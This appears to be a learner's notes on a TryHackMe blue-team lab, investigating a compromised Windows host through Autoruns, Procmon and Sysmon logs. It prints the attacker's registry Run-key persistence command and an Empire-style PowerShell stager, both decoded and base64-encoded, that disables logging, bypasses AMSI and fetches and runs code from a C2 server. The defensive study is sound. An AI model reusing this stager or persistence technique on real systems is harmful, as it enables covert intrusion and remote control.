@@ -1,0 +1,498 @@
+Name: Investigating Windows 3.x
+Date: 22/01/2022
+Difficulty: Medium
+Description: Find the artifacts resident on the endpoint and sift through captured data to determine what type attack occurred on the endpoint. 
+Better Description: A serious blue team bnox
+Goals: Improve powershell and general windows sysadmin understanding
+Learnt: Some headway into using Powershell with event logging
+
+
+Disclaimer:
+
+These are more documentative notes.
+
+In my attempt to understand Windows, use powershell more for my OSCP journey I extensively used Motasem Hamdan videofor help and directional pointers when I got stuck. 
+This is in NO way a write up or guide more, but more of a  documentation for myself as noting device to improve my writing capabilities. 
+With that said, even though I did the last investigation mostly by myself this room when first looking through it was very much more on the outset probably out of my depth.
+I have completed at thsi point 90% of the cyberdefense path, having learnt everything primarily through using TryHackMe. 
+If you want a challenge don't read this. If you want a walkthrough this might help as I will try to explain things, but in all likehood you probably are better than me so it still might not be useful. 
+To keep this honest for my own development I will try to add to whatever I have found with more explaination with or without things I needed help with. 
+Strictly this more of a blogging with some attempts at humour thrown in and lots of references to some great people.
+
+Like and Subscribe to Motasem Hamdan! He has an extensive library of high quality videos.
+HIGHLY recommend:
+https://www.youtube.com/c/MotasemHamdaninfosec
+https://www.youtube.com/watch?v=0l4igfsF1Ys
+
+While wait for the two gui icons programs on the desktop to load, I scouted around some of important directories. 
+Saw a C:\Sysmon directory that I could not access as Administrator so I just:
+icacls /grant Administrator:(F)
+It contained loads of weird dlls, exes, mui files. 
+I applied a filter in 
+path include *.exe and it crashed...
+
+Starting again, armed with a more conventional approach I opened all of the icons on desktop: Autorunes and Procmon, Event viewer:
+Highlighted in yellow are the weird autoruns. The registry above the Updater
+Updater                 File not found: $x=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x
+
+.Debug          # Name of the value which the data from the encoding is placed
+-enc $x         # encode variable named x
+$x=$((..        # pass the value of HKCU:(Hive Key Current User) \Software\...\CurrentVersion !!TO powershell.exe ...
+Thus the registry key with the encoded payload is:
+HKCU\Software\Microsoft\Windows\CurrentVersion
+
+The "\Run" part is just to run payload, the base64 string can be found in regedit under the exact directory given as the answer for the question.
+
+With value Debug
+cwBjAC4AZQB4AGUAIABzAHQA ... its huge and has alot of "."s in. 
+Also as side note of decoding this with Cyberchefand can also find and use the numberwang function in Cyberchef for absolutely no value other than British sketch show easteregg fun.
+
+9! That's Numberwang!
+
+Did you know: The most Numberwang musical note is G#.
+
+Then using to remove dots:https://www.text-filter.com/Remove-Specific-Certain-Characters-From-Text-Remove-Delete-Numbers-Remove-Delete-Letters-Removing-Certain-Non-Alphanumeric-Characters-From-Text-Excel-Online.htm
+And then Cyberchef:
+
+scexestartFax;$FTPServer="localhost";$FTPPort="9299";$tcpConnection=New-ObjectSystemNetSocketsTcpClient($FTPServer,$FTPPort);$tcpStream=$tcpConnectionGetStream();$reader=New-ObjectSystemIOStreamReader($tcpStream);$writer=New-ObjectSystemIOStreamWriter($tcpStream);$writerAutoFlush=$true;$commands=@("DQA=",'awBpAGwAbA ... lots of data till in base64...
+while($tcpConnectionConnected){while($tcpStreamDataAvailable){$readerReadLine()};if($tcpConnectionConnected){For($i=0;$i-lt5;$i++){ForEach($strin$commands){Start-Sleep-s1;$command=[SystemTextEncoding]::UnicodeGetString([SystemConvert]::FromBase64String($str));$writerWriteLine($command)|Out-Null;};};break;};};$readerClose();$writerClose();$tcpConnectionClose();
+
+Fax machines!, FTPserver at port 9299, basically checking to C2 commands decoding them and executing them.
+
+kill(Get-ProcessFXSSVC)Id-force;Remove-Item-path'C:\Windows\System32\ualapidll';IF($PSVErSIONTABlEPSVErsIoNMAJOr-GE3){$fff6=[ref]ASsemBLyGetTypE('SystemManagementAutomationUtils')"GetFie`ld"('cachedGroupPolicySettings','N'+'onPublic,Static');If($ffF6){$B9BE=$fFf6GETValUe($NULL);If($B9bE['ScriptB'+'lockLogging']){$B9Be['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$b9Be['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$vAl=[COLlECtiOnSGEnErIcDIcTIoNARy[STrinG,SyStEMOBjecT]]::nEw();$ValADD('EnableScriptB'+'lockLogging',0);$VALADd('EnableScriptBlockInvocationLogging',0);$b9bE['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$VAl}ElSE{[SCRipTBlock]"GeTFie`ld"('signatures','N'+'onPublic,Static')SETVaLue($nULl,(New-OBjECtCOLlectIoNsGEnerICHaSHSeT[sTrIng]))}$Ref=[Ref]ASSEmblyGeTType('SystemManagementAutomationAmsi'+'Utils');$REfGEtFIELD('amsiInitF'+'ailed','NonPublic,Static')SetVaLUE($nuLl,$TruE);};[SystEmNETSErVICEPoIntMAnAgeR]::ExPEcT100COnTInue=0;$27CE=NeW-OBJEctSYsTEmNEtWEBClIeNT;$u='Mozilla/50(WindowsNT61;WOW64;Trident/70;rv:110)likeGecko';$ser=$([TExtENCoDiNg]::UNiCoDeGETString([COnVeRt]::FrOMBAsE64STrINg('aAB0AHQAcAA6AC8ALwAzADQALgAyADQANQAuADEAMgA4AC4AMQA2ADEAOgA5ADAAMAAxAA==')));$t='/admin/getphp';$27CEHeadErsADD('User-Agent',$u);$27CePrOxY=[SySTEmNETWEBREqUesT]::DefAUltWEBPROXY;$27cePROXyCrEDENTIals=[SyStemNEtCREdEnTiAlCAChE]::DEFAULTNeTwoRKCrEdenTiALS;$Script:Proxy=$27ceProxy;$K=[SystEmTeXTEnCoDiNg]::ASCIIGeTBYTes('awXUDkit<oV9JcROL{%gQ|3nHqMpA/l');$R={$D,$K=$ArGs;$S=0255;0255|%{$J=($J+$S[$_]+$K[$_%$KCOunT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-
+
+Loads of
+kill process: kill(Get-ProcessFXSSVC)
+Removal of DLL: C:\Windows\System32\ualapidll 
+
+The encoded base64 address is:
+h.t.t.p.:././.3.4...2.4.5...1.2.8...1.6.1.:.9.0.0.1.
+
+To stop myself at this point rabbit holing and keeping to the question structure I returned to video saving the Event Viewer Sysmon logs to Desktop of the Administrator user. 
+Mostly some handholding to improve my powershell by atleast a direction to test and play around with. 
+Adding to my stash of cheatsheets and lists of useful commands with explaination that I yet(but will probably in the comming months of 2022 will do) by on Github.
+
+PS C:\Users\Administrator\Desktop> Get-WinEvent -Path .\sysmonlog.evtx -FilterXPath '*/System/EventID=13' | Sort-Object
+TimeCreated | Where-Object {$_.Message -like "*enc*" } | fl
+
+
+TimeCreated  : 1/21/2021 5:08:13 PM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 13
+Message      : Registry value set:
+               RuleName: technique_id=T1547.001,technique_name=Registry Run Keys / Start Folder
+               EventType: SetValue
+               UtcTime: 2021-01-22 01:08:13.468
+               ProcessGuid: {786593ca-776d-6009-4b00-000000000300}
+               ProcessId: 2684
+               Image: C:\Windows\Explorer.EXE
+               TargetObject:
+               HKU\S-1-5-21-1022688529-3069809663-3800007983-500\Software\Microsoft\Windows\CurrentVersion\Run\Updater
+               Details: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp
+               HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x"
+
+You can do this by just typing the same Where-Object (find this string, in the in the file specified) enc event log.
+
+File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2021-01-26 14:38:45.747
+ProcessGuid: {786593ca-2974-6010-bd00-000000000500}
+ProcessId: 1796
+Image: C:\Program Files\Windows Defender\MsMpEng.exe
+TargetFilename: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\ConfigDefender\MSFT_MpPreference.cdxml
+CreationUtcTime: 2021-01-26 14:38:45.747 
+
+The answers for first 10 question are included in the information above. 
+hen using mitre, the right hand side gives you the info of all the juice long descriptions to read in the main body of the text.
+
+https://attack.mitre.org/techniques/T1547/001/
+
+ID: T1547.001
+Sub-technique of:  T1547
+Tactics: Persistence, Privilege Escalation
+Platforms: Windows
+Permissions Required: Administrator, User
+CAPEC ID: CAPEC-270
+Contributors: Oddvar Moe, @oddvarmoe
+Version: 1.1
+Created: 23 January 2020
+Last Modified: 06 January 2021
+
+Because I have decoded the payload and its internal base64 encoded strings I know that it using the faxsvc or like some of the printer related CVEs, when I found out about this I found this increbibly funny for some reason. 
+That the chink massive corperate office IT armor - was not just the ordinary people in the office clicking away and photocopying their rear-ends and printing them out but also hackers using printers as the way in, like the drain at Helm's Deep in Lord of the Rings. 
+Those poor IT staff. Found this might be useful:
+
+https://github.com/countercept/chainsaw 
+
+"Chainsaw provides a powerful ‘first-response’ capability to quickly identify threats within Windows event logs. It offers a generic and fast method of searching through event logs for keywords, and by identifying threats using built-in detection logic and via support for Sigma detection rules."
+
+While searching for the next load of answers, I have previous coming across:
+https://windows-internals.com/printdemon-cve-2020-1048/
+https://github.com/ionescu007/faxhell
+https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/local/cve_2020_1048_printerdemon
+
+TLDR: The dynamic linked library ualapi.dll is used by the kernel in the process of creatin gprinter jobs but is maliciously used to as a will be trusted process given higher level privelleges to that process to do malicious stuff no the machine to elevate to them maintain persistence for the command and control. Dll sit in the middle of the control of an executable and can be called by various executables. The reason for existence of dlls is for code base maintainability, code reusability and process speed.
+
+Their are two Printer related, Fax is kind of printer from by-gone-but not forgotten age, as before the 9/11 people often send documents down the landline phones to each other, in A4 and probably other formats. It's amazing how far we have and haven't really gone as species. Thankful computers make less irrating noises these days.
+
+PrintService -> Admin only event is to change the New Default Printer to PrintDemon, event id 823. Printers use the spoolsv.exe 
+https://docs.microsoft.com/en-us/windows/win32/printdocs/print-spooler
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-PrintService" Guid="{747ef6fd-e535-4d16-b510-42c90f6873a1}" /> 
+  <EventID>823</EventID> 
+  <Version>0</Version> 
+  <Level>4</Level> 
+  <Task>49</Task> 
+  <Opcode>11</Opcode> 
+  <Keywords>0x8000000000020000</Keywords> 
+  <TimeCreated SystemTime="2021-01-22T01:08:17.293890800Z" /> 
+  <EventRecordID>1</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="2684" ThreadID="4132" /> 
+  <Channel>Microsoft-Windows-PrintService/Admin</Channel> 
+  <Computer>WIN-Q5JJRDM876J</Computer> 
+  <Security UserID="S-1-5-21-1022688529-3069809663-3800007983-500" /> 
+  </System>
+- <UserData>
+- <ChangingDefaultPrinter xmlns="http://manifests.microsoft.com/win/2005/08/windows/printing/spooler/core/events">
+  <DefaultPrinterSelectedBySpooler>1</DefaultPrinterSelectedBySpooler> 
+  <OldDefaultPrinter>-</OldDefaultPrinter> 
+  <NewDefaultPrinter>PrintDemon</NewDefaultPrinter> 
+  <Status>0x0</Status> 
+  <Module>winspool.drv</Module> 
+  </ChangingDefaultPrinter>
+  </UserData>
+  </Event>
+
+
+Returning to the video:
+
+We are using the same eventid but looking for the dll usage
+
+PS C:\Users\Administrator\Desktop> Get-WinEvent -Path .\sysmonlog.evtx -FilterXPath '*/System/EventID=13' | Sort-Object TimeCreated | Where-Object {$_.Message -like "*ualapi.dll*" } | fl
+
+
+TimeCreated  : 1/21/2021 5:08:11 PM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 13
+Message      : Registry value set:
+               RuleName: technique_id=T1547.010,technique_name=Boot or Logon Autostart Execution - Port Monitors
+               EventType: SetValue
+               UtcTime: 2021-01-22 01:08:11.733
+               ProcessGuid: {786593ca-756b-6009-2200-000000000300}
+               ProcessId: 1596
+               Image: C:\Windows\System32\spoolsv.exe
+               TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Ports\C:\Windows\system32\ualapi.dll
+               Details: (Empty)
+
+Use this command or have found a 1596 pid and look through procmon which tried to looked around and got stuck. Lesson learn, remember to click into property windows, GUI does not lie just hides stuff through amount of tabs and sub windows...
+620 is the parent pid of 1596.
+
+Flashback to:
+$x=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x
+powershell is running this, so procmon filter for include : process name : powershell.exe
+
+pid = 3088
+
+Returning to payload decoding, by myself noticed the only path is:
+
+$t='/admin/getphp
+
+add a . and you you get.php!
+
+$27CEHeadErsADD('User-Agent',$u)
+
+Looked some more, failed some more. Motasem mentions a files in Documents. First file contains The same IP address in the base64.
+He points out the third being related to Empire. 
+https://github.com/EmpireProject/Empire
+Room on tryhackme:
+https://tryhackme.com/room/rppsempire
+Very cool tool. 
+
+https://github.com/EmpireProject/Empire/wiki/Quickstart
+IT ALSO has multi extensions!
+/news.php, /login/process.php
+https://attack.mitre.org/software/S0363/
+
+A FQDN = Fully qualified domain name
+wikipedia:
+A fully qualified domain name, sometimes also referred to as an absolute domain name, is a domain name that specifies its exact location in the tree hierarchy of the Domain Name System. 
+It specifies all domain levels, including the top-level domain and the root zone.
+
+nslookup: THEIPBASE64ENCODED above!
+root@ip-10-10-1-143:~# nslookup http://34.245.128.161:9001
+Server:         127.0.0.53
+Address:        127.0.0.53#53
+
+** server can't find http://34.245.128.161:9001: NXDOMAIN
+
+root@ip-10-10-1-143:~# nslookup http://34.245.128.161
+Server:         127.0.0.53
+Address:        127.0.0.53#53
+
+** server can't find http://34.245.128.161: NXDOMAIN
+
+root@ip-10-10-1-143:~# nslookup 34.245.128.161
+161.128.245.34.in-addr.arpa     name = ec2-34-245-128-161.eu-west-1.compute.amazonaws.com.
+
+Authoritative answers can be found from:
+
+
+Filtering to TCP Connect as an OPeration like Motasem demonstrates at the same time as the powershell.exe will show:
+5:05:4.. powershell.exe 3088 TCP Connect WIN-Q5JJRDM876J.localdomain:49736 -> ec2-34-245-128-161.eu-west-1.compute.amazonaws.com:9001
+Without the powershell.exe filter the other process is: Explorer.EXE as FQDN, port is used and 2864 is pid which I feel like I have seen alot. 
+And so the next question look for EventID=7 as that is image related events with Explorer.EXE. By myself I got:
+
+PS C:\Users\Administrator\Desktop> Get-WinEvent -Path .\sysmonlog.evtx -FilterXPath '*/System/EventID=13' | Sort-Object TimeCreated | Where-Object {$_.Message -like "*Explorer.EXE*" } | fl
+
+
+TimeCreated  : 1/21/2021 5:08:13 PM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 13
+Message      : Registry value set:
+               RuleName: technique_id=T1547.001,technique_name=Registry Run Keys / Start Folder
+               EventType: SetValue
+               UtcTime: 2021-01-22 01:08:13.468
+               ProcessGuid: {786593ca-776d-6009-4b00-000000000300}
+               ProcessId: 2684
+               Image: C:\Windows\Explorer.EXE
+               TargetObject:
+               HKU\S-1-5-21-1022688529-3069809663-3800007983-500\Software\Microsoft\Windows\CurrentVersion\Run\Updater
+               Details: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp
+               HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x"
+
+TimeCreated  : 1/26/2021 8:42:22 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 13
+Message      : Registry value set:
+               RuleName: technique_id=T1546.001,technique_name=Change Default File Association
+               EventType: SetValue
+               UtcTime: 2021-01-26 16:42:22.633
+               ProcessGuid: {786593ca-45c9-6010-6100-000000000600}
+               ProcessId: 3660
+               Image: C:\Windows\Explorer.EXE
+               TargetObject: HKU\S-1-5-21-1022688529-3069809663-3800007983-500\Software\Microsoft\Windows\CurrentVersio
+               n\Explorer\FileExts\.arn\OpenWithList\a
+               Details: Autoruns.exe
+
+TimeCreated  : 1/26/2021 10:00:52 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 13
+Message      : Registry value set:
+               RuleName: technique_id=T1546.001,technique_name=Change Default File Association
+               EventType: SetValue
+               UtcTime: 2021-01-26 18:00:52.380
+               ProcessGuid: {786593ca-531a-6010-5500-000000000800}
+               ProcessId: 3932
+               Image: C:\Windows\Explorer.EXE
+               TargetObject: HKU\S-1-5-21-1022688529-3069809663-3800007983-500\Software\Microsoft\Windows\CurrentVersio
+               n\Explorer\FileExts\.PML\OpenWithList\a
+               Details: Procmon.exe
+
+TimeCreated  : 1/26/2021 10:04:43 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 13
+Message      : Registry value set:
+               RuleName: technique_id=T1546.001,technique_name=Change Default File Association
+               EventType: SetValue
+               UtcTime: 2021-01-26 18:04:43.516
+               ProcessGuid: {786593ca-531a-6010-5500-000000000800}
+               ProcessId: 3932
+               Image: C:\Windows\Explorer.EXE
+               TargetObject: HKU\S-1-5-21-1022688529-3069809663-3800007983-500\Software\Microsoft\Windows\CurrentVersio
+               n\Explorer\FileExts\.xml\OpenWithList\a
+               Details: NOTEPAD.EXE
+
+Which does get much in the way of answers, filtered by Explorer.EXE in Procmon then go there are loads now with pid 2684 and then there is still alot, add operation: 
+Load Image; for:
+C:\Windows\System32\mscoree.dll
+
+Lesson learnt from trying follow along for future: 
+If these two processes are connected they would be through similar times as they would both have to running in some way at some point.
+PS C:\Users\Administrator\Desktop> Get-WinEvent -Path .\sysmonlog.evtx -FilterXPath '*/System/EventID=13' | Sort-Object TimeCreated | Where-Object {$_.Message -like "*enc*" } | fl
+
+
+TimeCreated  : 1/21/2021 5:08:13 PM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 13
+Message      : Registry value set:
+               RuleName: technique_id=T1547.001,technique_name=Registry Run Keys / Start Folder
+               EventType: SetValue
+               UtcTime: 2021-01-22 01:08:13.468
+               ProcessGuid: {786593ca-776d-6009-4b00-000000000300}
+               ProcessId: 2684
+               Image: C:\Windows\Explorer.EXE
+               TargetObject: HKU\S-1-5-21-1022688529-3069809663-3800007983-500\Software\Microsoft\Windows\CurrentVersion\Run\Updater
+               Details: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x"
+
+5:08:13 is the time this payload was created, BY MOST IMPORTANTLY explorer.exe  because you working out what happens after this happened
+
+Then same but for powershell, using eventid=1 this time as EventID=1 is process creation and EventID=13 is registry value setting. 
+
+
+PS C:\Users\Administrator\Desktop> Get-WinEvent -Path .\sysmonlog.evtx -FilterXPath '*/System/EventID=1' | Sort-Object TimeCreated | Where-Object {$_.Message -like "*enc*" } | fl
+
+
+TimeCreated  : 1/21/2021 5:05:45 PM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 1
+Message      : Process Create:
+               RuleName: technique_id=T1059.001,technique_name=PowerShell
+               UtcTime: 2021-01-22 01:05:45.938
+               ProcessGuid: {786593ca-24e9-600a-eb00-000000000300}
+               ProcessId: 3088
+               Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+               FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
+               Description: Windows PowerShell
+               Product: Microsoft® Windows® Operating System
+               Company: Microsoft Corporation
+               OriginalFileName: PowerShell.EXE
+               CommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAUwBJAE8ATgBUAEEAQgBsAEUALgBQAFMAVgBFAHIAcwBJAG8ATgAuAE0AQQBKAE8AcgAgAC0ARwBFACAAMwApAHsAJABmAGYAZgA2AD0AWwByAGUAZgBdAC4AQQBTAHMAZQBtA
+               EIATAB5AC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcAZQB0AEYAaQBlAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACs
+               AJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAGYAZgBGADYAKQB7ACQAQgA5AEIARQA9ACQAZgBGAGYANgAuAEcARQBUAFYAYQBsAFUAZQAoACQATgBVAEwATAApADsASQBmACgAJABCADkAYgBFAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQ
+               gA5AEIAZQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABiADkAQgBlAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwA
+               nAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBBAGwAPQBbAEMATwBMAGwARQBDAHQAaQBPAG4AUwAuAEcARQBuAEUAcgBJAGMALgBEAEkAYwBUAEkAbwBOAEEAUgB5AFsAUwBUAHIAaQBuAEcALABTAHkAUwB0AEUATQAuAE8AQgBqA
+               GUAYwBUAF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAEEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8
+               AZwBnAGkAbgBnACcALAAwACkAOwAkAGIAOQBiAEUAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAb
+               ABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAGwAfQBFAGwAUwBFAHsAWwBTAEMAUgBpAHAAVABCAGwAbwBjAGsAXQAuACIARwBlAFQARgBpAGUAYABsAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUAZQA
+               oACQAbgBVAEwAbAAsACgATgBlAHcALQBPAEIAagBFAEMAdAAgAEMATwBMAGwAZQBjAHQASQBvAE4AcwAuAEcARQBuAGUAcgBJAEMALgBIAGEAUwBIAFMAZQBUAFsAcwBUAHIASQBuAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAGUAZgBdAC4AQQBTAFMARQBtAGIAbAB5AC4ARwBlAFQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNA
+               GEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAdABGAEkARQBMAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFY
+               AYQBMAFUARQAoACQAbgB1AEwAbAAsACQAVAByAHUARQApADsAfQA7AFsAUwB5AHMAdABFAG0ALgBOAEUAVAAuAFMARQByAFYASQBDAEUAUABvAEkAbgB0AE0AQQBuAEEAZwBlAFIAXQA6ADoARQB4AFAARQBjAFQAMQAwADAAQwBPAG4AVABJAG4AdQBlAD0AMAA7ACQAMgA3AEMARQA9AE4AZQBXAC0ATwBCAEoARQBjAHQAIABTAFkAc
+               wBUAEUAbQAuAE4ARQB0AC4AVwBFAEIAQwBsAEkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB
+               zAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AQwBvAEQAaQBOAGcAXQA6ADoAVQBOAGkAQwBvAEQAZQAuAEcARQBUAFMAdAByAGkAbgBnACgAWwBDAE8AbgBWAGUAUgB0AF0AOgA6AEYAcgBPAE0AQgBBAHMARQA2ADQAUwBUAHIASQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAegBBAEQAUQBBA
+               EwAZwBBAHkAQQBEAFEAQQBOAFEAQQB1AEEARABFAEEATQBnAEEANABBAEMANABBAE0AUQBBADIAQQBEAEUAQQBPAGcAQQA1AEEARABBAEEATQBBAEEAeABBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAAyADcAQwBFAC4ASABlAGEAZABFAHIAcwAuAEEARABEACgAJwBVAHM
+               AZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAMgA3AEMAZQAuAFAAcgBPAHgAWQA9AFsAUwB5AFMAVABFAG0ALgBOAEUAVAAuAFcARQBCAFIARQBxAFUAZQBzAFQAXQA6ADoARABlAGYAQQBVAGwAdABXAEUAQgBQAFIATwBYAFkAOwAkADIANwBjAGUALgBQAFIATwBYAHkALgBDAHIARQBEAEUATgBUAEkAYQBsAHMAIAA9ACAAW
+               wBTAHkAUwB0AGUAbQAuAE4ARQB0AC4AQwBSAEUAZABFAG4AVABpAEEAbABDAEEAQwBoAEUAXQA6ADoARABFAEYAQQBVAEwAVABOAGUAVAB3AG8AUgBLAEMAcgBFAGQAZQBuAFQAaQBBAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAAyADcAYwBlAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AEUAbQA
+               uAFQAZQBYAFQALgBFAG4AQwBvAEQAaQBOAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAFQAQgBZAFQAZQBzACgAJwBhAHcAWABVAEQAawBpAHQAPABvAFYAOQBKAGMAUgBPAEwAewAlAGcAUQAuAHwAMwBuAEgAcQBNAHAAQQAvAGwAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7A
+               DAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEg
+               APQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAAyADcAQwBFAC4ASABlAGEARABlAHIAcwAuAEEAZ
+               ABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBSAGoATQBlAGUAawA9AFoAbQBRAEwASABhAGMATQBCAFgAcgBMAGMAQgArAFYARQBsAHYATABjAHcATwAyADYARQBZAD0AIgApADsAJABEAGEAdABBAD0AJAAyADcAQwBlAC4ARABPAHcAbgBsAG8AQQBkAEQAQQB0AEEAKAAkAFMAZQByACsAJABUACkAOwAkAGkAdgA9ACQARABhAFQAQQB
+               bADAALgAuADMAXQA7ACQARABhAHQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAYQAuAGwARQBOAGcAdABoAF0AOwAtAGoATwBJAE4AWwBDAEgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
+               CurrentDirectory: C:\Users\Administrator\
+               User: WIN-Q5JJRDM876J\Administrator
+               LogonGuid: {786593ca-776c-6009-5ea8-030000000000}
+               LogonId: 0x3A85E
+               TerminalSessionId: 1
+               IntegrityLevel: High
+               Hashes: SHA1=6CBCE4A295C163791B60FC23D285E6D84F28EE4C,MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
+               ParentProcessGuid: {786593ca-24a3-600a-e400-000000000300}
+               ParentProcessId: 3624
+               ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+               ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+
+
+Without even realising looking for *enc* was actually what Motasem ends up doing anyway. On to the improving of my powershell. Using these two times.
+
